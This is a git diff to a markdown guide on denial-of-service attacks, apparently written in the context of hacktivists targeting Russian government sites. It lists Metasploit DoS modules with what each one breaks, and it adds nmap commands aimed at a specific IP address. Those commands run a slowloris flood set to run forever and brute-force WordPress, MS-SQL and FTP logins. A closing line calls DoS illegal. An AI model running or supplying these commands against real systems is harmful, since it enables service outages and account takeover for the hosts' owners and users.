@@ -91,15 +91,26 @@ Hacktivists are attacking the Russian government sites trying to make them offli
 
 Pretty much anyone can run a DoS tool to make a particular IP go off line due to too many requests. See a small list of popular tools for DoS attacks:
 
+Metasploit Modules
+
 ```
-Metasploit - auxiliary/dos/tcp/synflood (Flood the server with SYN packets)
-Metasploit - auxiliary/dos/http/slowloris.py (Makes lots of HTTP requests and sends headers periodically to keep the connections open)
-Metasploit - auxiliary/dos/http/apache_range_dos.rb (Causes high memory and CPU consumption on Apache 2.0.x through 2.0.64, and 2.2.x through 2.2.19)
-Metasploit - auxiliary/dos/http/gzip_bomb_dos.rb (Generates and hosts a 10MB single-round gzip file that decompresses to 10GB)
-Metasploit - auxiliary/dos/http/hashcollision_dos.rb (Can cause a web server parsing the POST parameters issued with a request into a hash table to consume hours of CPU with a single HTTP request)
-Metasploit - auxiliary/dos/ssl/dtls_changecipherspec.rb (Attack against Datagram TLS in OpenSSL version 0.9.8i and earlier)
-Metasploit - auxiliary/dos/ntp/ntpd_reserved_dos.rb (Created an infinite looping of NTP requests between two NTP servers)
-Metasploit - auxiliary/dos/dns/bind_tsig.rb (Can crash a DNS server if it is vulnerable to CVE-2016-2776)
+auxiliary/dos/tcp/synflood (Flood the server with SYN packets)
+auxiliary/dos/http/slowloris.py (Makes lots of HTTP requests and sends headers periodically to keep the connections open)
+auxiliary/dos/http/apache_range_dos.rb (Causes high memory and CPU consumption on Apache 2.0.x through 2.0.64, and 2.2.x through 2.2.19)
+auxiliary/dos/http/gzip_bomb_dos.rb (Generates and hosts a 10MB single-round gzip file that decompresses to 10GB)
+auxiliary/dos/http/hashcollision_dos.rb (Can cause a web server parsing the POST parameters issued with a request into a hash table to consume hours of CPU with a single HTTP request)
+auxiliary/dos/ssl/dtls_changecipherspec.rb (Attack against Datagram TLS in OpenSSL version 0.9.8i and earlier)
+auxiliary/dos/ntp/ntpd_reserved_dos.rb (Created an infinite looping of NTP requests between two NTP servers)
+auxiliary/dos/dns/bind_tsig.rb (Can crash a DNS server if it is vulnerable to CVE-2016-2776)
+```
+
+NMAP
+
+```
+nmap 95.173.136.168 --max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
+nmap -sV --script http-wordpress-brute --script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true’ 95.173.136.168
+nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 95.173.136.168
+nmap --script ftp-brute -p 21 95.173.136.168
 ```
 
 **NOTE:** DoS and DDoS are ilegal pactices in most if not all countries. Do not attempt to do it, it is a crime!
